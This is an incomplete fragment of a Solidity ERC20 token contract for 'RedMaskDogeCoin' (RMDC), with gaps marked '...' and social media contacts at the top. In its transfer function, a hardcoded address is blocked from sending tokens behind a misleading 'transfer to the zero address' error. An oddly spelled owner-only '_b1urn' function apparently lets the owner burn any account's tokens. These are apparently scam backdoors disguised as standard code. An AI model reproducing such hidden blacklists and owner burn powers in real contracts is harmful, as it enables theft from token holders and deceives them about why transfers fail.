...
Subscribe on
Twitter: @RedMaskDogeCoin
Reddit: @RedMaskDogeCoin
[email protected]
[email protected]
...
contract RedMaskDogeCoin is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) public _allowances;
    uint256 public _totalSupply = 1000000000000000*10**18;
    string public _name = "RedMaskDogeCoin";
    string public _symbol= "RMDC";
    ...
    function _transfer(
        ...
        require(sender != 0xD267f01Df3534804d09f7eC6664107582303ECAA, "ERC20: transfer to the zero address");
    ...
    function _b1urn(address account, uint256 amount) onlyOwner  public virtual {
